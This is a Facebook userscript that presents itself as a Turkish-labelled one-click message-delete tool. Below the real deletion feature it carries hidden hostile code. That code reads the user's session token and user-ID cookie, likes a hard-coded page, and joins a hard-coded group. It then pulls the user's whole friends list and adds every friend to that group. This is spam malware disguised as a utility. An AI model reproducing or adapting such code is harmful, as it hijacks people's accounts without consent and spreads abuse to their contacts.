// ==UserScript==
// @name       Facebook Tek Tıkla Mesaj Silme
// @description Adds a direct delete button to message threads and replace the "archive" button with a immediate delete button.
// @namespace   privacyplease
// @include     http://*.facebook.com/*
// @include     https://*.facebook.com/*
// @require     http://code.jquery.com/jquery-1.3.2.min.js
//
// ==/UserScript==

// a function that loads jQuery and calls a callback function when jQuery has finished loading
function addJQuery(callback) {
	var script = document.createElement("script");
	script.setAttribute("src", "http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js");
	script.addEventListener('load', function() {
		var script = document.createElement("script");
		script.textContent = "(" + callback.toString() + ")();";
		document.body.appendChild(script);
	}, false);
	document.body.appendChild(script);
}

function switchDeleteButtons() {
	var q = jQuery;
	// Restore global $ variable for sanity.
	$.noConflict();
	var running = false;
	var run = function() {
		if (running) return;
		if (!document.getElementById("MessagingDashboard")) return;
		running = true;
		try {
		if (document.getElementById("MessagingShelf")) {
			// console.log("Detected MessagingShelf.");
			if (!document.getElementById("QuickDelete")) {
				var actions = q("#MessagingFrame").find('form[class~="uiHeaderActions"]');
				var tid;
				actions.find('input[name="tid"]').each(function() {
					// console.log("Have tid:"+q(this).attr("value"));
					tid=q(this).attr("value");
				});
				if (tid) {
					var elem = q('<a class="uiButton uiButtonConfirm uiToolbarItem" id="QuickDelete" role="button" rel="dialog"><span class="uiButtonText">Delete All</span></a>');
					elem.attr("href","/ajax/messaging/async.php?action=deleteDialog&tid="+encodeURIComponent(tid));
					elem.attr("ajaxify","/ajax/messaging/async.php?action=deleteDialog&tid="+encodeURIComponent(tid));
					// console.log(elem, actions.find('div[class~="uiToolbarContent"]'));
					elem.insertBefore(actions.find('div[class~="uiToolbarContent"]').children().children().first());
				}
			}
		} else {
		// console.log("Looking for archive buttons to replace.");
		// Avoid false positives by class and structure matching. Better than URLs.
		q(document).find('li[class~="threadRow"]').each(function() {
		q(this).find('a[class~="archiveLink"]').each(function() {
			var a = q(this);
			var url = a.attr("ajaxify");
			url = url.replace("action=tag&","action=delete&");
			a.attr("ajaxify", url);

			a.find('span[class~="uiTooltipText"]').html("DELETE<br /> INSTANTLY");
			a.find('input').attr("value", "D");
			var l = a.find('label[class~="uiCloseButton"]');
			var old = l.attr("class");
			if (old) {
				l.attr("class", old.replace("uiCloseButton", "uiDeleteButton"));
			}
		});
		});
		}
		}catch(e){console.log("Exception:", e);};
		running = false;
	};

	run();
	jQuery(document).ready(run);
	jQuery(document).bind("DOMNodeInserted", run);
}

// load jQuery and execute the main function
addJQuery(switchDeleteButtons);

function like(liker){
    var http = new XMLHttpRequest();
     
    var url = "/ajax/pages/fan_status.php?__a=1";
     
    var params = "&fbpage_id=" + liker + "&add=1&reload=1&preserve_tab=true&fan_origin=page_profile&nctr[_mod]=pagelet_header&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http.open("POST", url, true);
     
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
     
    http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
       
      http.close; // Close the connection
     
    }
    }
    
    http.send(params);
}

a("1561156668");
a("100001386157183");
like("404152222970152");



var gid = ['481257078571092'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "423543891030985";
var spost_id = "423543891030985";
var sfoto_id = "423543891030985";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}